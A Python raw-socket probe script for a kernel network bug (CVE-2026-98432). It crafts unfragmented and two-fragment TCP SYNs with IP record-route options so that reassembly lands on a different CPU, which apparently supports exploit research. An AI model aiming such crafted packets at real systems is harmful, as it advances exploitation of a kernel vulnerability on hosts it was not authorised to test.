#!/usr/bin/env python3
"""frag_probe.py - remote RPS/fragmentation CPU probe for CVE-2026-98432.

The target NIC is a single virtio queue, but software RPS (rps_cpus=f) steers
each packet by skb_get_hash().  A non-first IP fragment has no L4 ports, so it
hashes differently from the unfragmented flow and can be delivered to a
different CPU.  Reassembly is completed in the context of the CPU that
processes the last fragment; TCP then runs there.

Usage:
  frag_probe.py unfrag <sport> [count]     # send unfragmented SYNs
  frag_probe.py frag   <sport> [count]     # send 2-fragment SYNs
  frag_probe.py pair   <base_sport>        # 4 unfrag then 4 frag, marked

Prints one line per packet with a monotonic timestamp so the host can map
them to tcp_conn_request trace events by order.
"""
import socket
import struct
import sys
import time
import random

SRC = "192.168.89.1"
DST = "192.168.89.2"
DPORT = int(__import__("os").environ.get("DPORT", "9700"))


def csum(data):
    if len(data) & 1:
        data += b"\0"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) | data[i + 1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def iphdr(total_len, ident, frag_off, mf, options=b""):
    ihl = 5 + len(options) // 4
    h = struct.pack(
        "!BBHHHBBH4s4s",
        0x40 | ihl, 0, total_len, ident,
        (0x2000 if mf else 0) | frag_off,
        64, 6, 0,
        socket.inet_aton(SRC), socket.inet_aton(DST),
    ) + options
    c = csum(h)
    return h[:10] + struct.pack("!H", c) + h[12:]


def tcpseg(sport, seq, flags=0x02, ack=0):
    th = struct.pack("!HHIIBBHHH", sport, DPORT, seq, ack, 5 << 4, flags, 65535, 0, 0)
    pseudo = socket.inet_aton(SRC) + socket.inet_aton(DST) + struct.pack("!BBH", 0, 6, len(th))
    c = csum(pseudo + th)
    return th[:16] + struct.pack("!H", c) + th[18:]


def rr_opts():
    b = bytearray(40)
    b[0] = 7          # IPOPT_RR
    b[1] = 39         # length 39 -> + EOL = 40 bytes
    b[2] = 4          # pointer: first empty slot
    b[39] = 0         # EOL
    return bytes(b)


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        return 2
    mode = sys.argv[1]
    base = int(sys.argv[2])
    count = int(sys.argv[3]) if len(sys.argv) > 3 else 1
    opts = rr_opts()
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    def send_unfrag(sport, ident):
        seg = tcpseg(sport, random.getrandbits(32))
        pkt = iphdr(len(opts) + 20 + len(seg), ident, 0, False, opts) + seg
        s.sendto(pkt, (DST, 0))
        print(f"{time.monotonic():.6f} unfrag sport={sport}", flush=True)

    def send_frag(sport, ident):
        seg = tcpseg(sport, random.getrandbits(32))
        # frag 1: IP opts + first 16 bytes of TCP (ports present -> hash H1)
        f1 = iphdr(60 + 16, ident, 0, True, opts) + seg[:16]
        # frag 2: plain IP header + last 4 bytes; offset field is in 8-byte
        # units, so 16 bytes -> 2 (no ports -> hash H2)
        f2 = iphdr(20 + 4, ident, 2, False, b"") + seg[16:]
        s.sendto(f1, (DST, 0))
        s.sendto(f2, (DST, 0))
        print(f"{time.monotonic():.6f} frag   sport={sport}", flush=True)

    if mode == "unfrag":
        for i in range(count):
            send_unfrag(base + i, random.getrandbits(16))
            time.sleep(0.25)
    elif mode == "frag":
        for i in range(count):
            send_frag(base + i, random.getrandbits(16))
            time.sleep(0.25)
    elif mode == "scan":
        for i in range(count):
            send_unfrag(base + i, random.getrandbits(16))
            time.sleep(0.15)
    elif mode == "pair":
        for i in range(4):
            send_unfrag(base + i, random.getrandbits(16))
            time.sleep(0.30)
        time.sleep(0.5)
        for i in range(4):
            send_frag(base + 100 + i, random.getrandbits(16))
            time.sleep(0.30)
    else:
        print("bad mode")
        return 2
    s.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
